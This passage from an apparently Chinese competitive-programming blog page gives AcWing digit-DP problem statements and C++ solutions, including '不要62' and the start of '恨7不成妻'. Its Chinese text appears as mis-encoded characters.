ä¸”æ‰€ä»¥æ•°ä½å±±æ•°çš„å’Œä¸ºkçš„æ•°ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="keyword">sizeof</span> f);  <span class="comment">// æ¯è½®æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) f[<span class="number">1</span>][i][i % N] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">9</span>; x++) &#123;</span><br><span class="line">          f[i][j][k] += f[i - <span class="number">1</span>][x][<span class="built_in">mod</span>(k - j, N)];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 0 mod N æ€»ç­‰äº0, ç¬¦åˆè¦æ±‚</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j++) &#123;</span><br><span class="line">      res += f[i + <span class="number">1</span>][j][<span class="built_in">mod</span>(-last, N)];</span><br><span class="line">    &#125;</span><br><span class="line">    last = <span class="built_in">mod</span>(last + x, N);</span><br><span class="line">    <span class="keyword">if</span> (!i &amp;&amp; <span class="built_in">mod</span>(last, N) == <span class="number">0</span>) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;N) == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">init</span>();  <span class="comment">// è®°å¾—init()</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1085-ä¸è¦62"><a href="https://www.acwing.com/problem/content/1087/">AcWing 1085. ä¸è¦62</a></h2><p>æ­å·äººç§°é‚£äº›å‚»ä¹ä¹ç²˜å—’å—’çš„äººä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>62</mn></mrow><annotation encoding="application/x-tex">62</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">62</span></span></span></span>ï¼ˆéŸ³ï¼šlaoerï¼‰ã€‚</p><p>æ­å·äº¤é€šç®¡ç†å±€ç»å¸¸ä¼šæ‰©å……ä¸€äº›çš„å£«è½¦ç‰Œç…§ï¼Œæ–°è¿‘å‡ºæ¥ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼Œä»¥åä¸Šç‰Œç…§ï¼Œä¸å†å«æœ‰ä¸å‰åˆ©çš„æ•°å­—äº†ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå°±å¯ä»¥æ¶ˆé™¤ä¸ªåˆ«çš„å£«å¸æœºå’Œä¹˜å®¢çš„å¿ƒç†éšœç¢ï¼Œæ›´å®‰å…¨åœ°æœåŠ¡å¤§ä¼—ã€‚</p><p>ä¸å‰åˆ©çš„æ•°å­—ä¸ºæ‰€æœ‰å«æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> æˆ– <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>62</mn></mrow><annotation encoding="application/x-tex">62</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">62</span></span></span></span> çš„å·ç ã€‚ä¾‹å¦‚ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>62315</mn><mo separator="true">,</mo><mn>73418</mn><mo separator="true">,</mo><mn>88914</mn></mrow><annotation encoding="application/x-tex">62315,73418,88914</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">62315</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">73418</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">88914</span></span></span></span> éƒ½å±äºä¸å‰åˆ©å·ç ã€‚ä½†æ˜¯ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>61152</mn></mrow><annotation encoding="application/x-tex">61152</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">61152</span></span></span></span> è™½ç„¶å«æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn></mrow><annotation encoding="application/x-tex">6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>ï¼Œä½†ä¸æ˜¯ è¿å·ï¼Œæ‰€ä»¥ä¸å±äºä¸å‰åˆ©æ•°å­—ä¹‹åˆ—ã€‚</p><p>ä½ çš„ä»»åŠ¡æ˜¯ï¼Œå¯¹äºæ¯æ¬¡ç»™å‡ºçš„ä¸€ä¸ªç‰Œç…§å·åŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[n,m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span>ï¼Œæ¨æ–­å‡ºäº¤ç®¡å±€ä»Šååˆè¦å®é™…ä¸Šç»™å¤šå°‘è¾†æ–°çš„å£«è½¦ä¸Šç‰Œç…§äº†ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„æ•°æ®å ä¸€è¡Œã€‚</p><p>æ¯ç»„æ•°æ®åŒ…å«ä¸€ä¸ªæ•´æ•°å¯¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>ã€‚</p><p>å½“è¾“å…¥ä¸€è¡Œä¸ºâ€œ0 0â€æ—¶ï¼Œè¡¨ç¤ºè¾“å…¥ç»“æŸã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å¯¹äºæ¯ä¸ªæ•´æ•°å¯¹ï¼Œè¾“å‡ºä¸€ä¸ªä¸å«æœ‰ä¸å‰åˆ©æ•°å­—çš„ç»Ÿè®¡ä¸ªæ•°ï¼Œè¯¥æ•°å€¼å ä¸€è¡Œä½ç½®ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mi>m</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le m \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>1 1000 0</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>80</code></pre><h3 id="é¢˜è§£-3">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¡ç®—f[i][j]: iä½, ä¸”æœ€é«˜ä½ä¸ºjçš„æ»¡è¶³æ¡ä»¶æ•°çš„ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">4</span>) <span class="keyword">continue</span>;</span><br><span class="line">    f[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">4</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">4</span> || (j == <span class="number">6</span> &amp;&amp; k == <span class="number">2</span>)) <span class="keyword">continue</span>;</span><br><span class="line">        f[i][j] += f[i - <span class="number">1</span>][k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">4</span> || (last == <span class="number">6</span> &amp;&amp; j == <span class="number">2</span>)) <span class="keyword">continue</span>;</span><br><span class="line">      res += f[i + <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">4</span> || (last == <span class="number">6</span> &amp;&amp; x == <span class="number">2</span>)) <span class="keyword">break</span>;</span><br><span class="line">    last = x;</span><br><span class="line">    <span class="keyword">if</span> (!i) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r), l || r) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1086-æ¨7ä¸æˆå¦»"><a href="https://www.acwing.com/problem/content/1088/">AcWing 1086. æ¨7ä¸æˆå¦»</a></h2><p>å•èº«ï¼</p><p>ä¾ç„¶å•èº«ï¼</p><p>å‰å“¥ä¾ç„¶å•èº«ï¼</p><p>DS çº§ç å†œå‰å“¥ä¾ç„¶å•èº«ï¼</p><p>æ‰€ä»¥ï¼Œä»–å¹³ç”Ÿæœ€æ¨æƒ…äººèŠ‚ï¼Œä¸ç®¡æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>214</mn></mrow><annotation encoding="application/x-tex">214</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">214</span></span></span></span> è¿˜æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>77</mn></mrow><annotation encoding="application/x-tex">77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">77</span></span></span></span>ï¼Œä»–éƒ½è®¨åŒï¼</p><p>å‰å“¥è§‚å¯Ÿäº† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>214</mn></mrow><annotation encoding="application/x-tex">214</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">214</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>77</mn></mrow><annotation encoding="application/x-tex">77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">77</span></span></span></span> è¿™ä¸¤ä¸ªæ•°ï¼Œå‘ç°ï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>+</mo><mn>1</mn><mo>+</mo><mn>4</mn><mo>=</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">2 + 1 + 4 = 7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn><mo>+</mo><mn>7</mn><mo>=</mo><mn>7</mn><mo>Ã—</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">7 + 7 = 7 \times 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>77</mn><mo>=</mo><mn>7</mn><mo>Ã—</mo><mn>11</mn></mrow><annotation encoding="application/x-tex">77 = 7 \times 11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">77</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span></p><p>æœ€ç»ˆï¼Œä»–å‘ç°åŸæ¥è¿™ä¸€åˆ‡å½’æ ¹åˆ°åº•éƒ½æ˜¯å› ä¸ºå’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> æœ‰å…³ï¼</p><p>æ‰€ä»¥ï¼Œä»–ç°åœ¨ç”šè‡³è®¨åŒä¸€åˆ‡å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> æœ‰å…³çš„æ•°ï¼</p><p>ä»€ä¹ˆæ ·çš„æ•°å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> æœ‰å…³å‘¢ï¼Ÿ</p><p>å¦‚æœä¸€ä¸ªæ•´æ•°ç¬¦åˆä¸‹é¢ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´è¿™ä¸ªæ•´æ•°å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> æœ‰å…³ï¼š</p><ol><li>æ•´æ•°ä¸­æŸä¸€ä½æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span>ï¼›</li><li>æ•´æ•°çš„æ¯ä¸€ä½åŠ èµ·æ¥çš„å’Œæ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> çš„æ•´æ•°å€ï¼›</li><li>è¿™ä¸ªæ•´æ•°æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> çš„æ•´æ•°å€ã€‚</li></ol><p>ç°åœ¨é—®é¢˜æ¥äº†ï¼šå‰å“¥æƒ³çŸ¥é“åœ¨ä¸€å®šåŒºé—´å†…å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> æ— å…³çš„æ•´æ•°çš„å¹³æ–¹å’Œã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>ï¼Œè¡¨ç¤ºå…±æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> ç»„æµ‹è¯•æ•°æ®ã€‚</p><p>æ¯ç»„æ•°æ®å ä¸€è¡Œï¼ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å¯¹äºæ¯ç»„æ•°æ®ï¼Œè¯·è®¡ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>L</mi><mo separator="true">,</mo><mi>R</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[L,R]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">]</span></span></span></span> ä¸­å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> æ— å…³çš„æ•°å­—çš„å¹³æ–¹å’Œï¼Œå¹¶å°†ç»“æœå¯¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>+</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">10^9+7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span 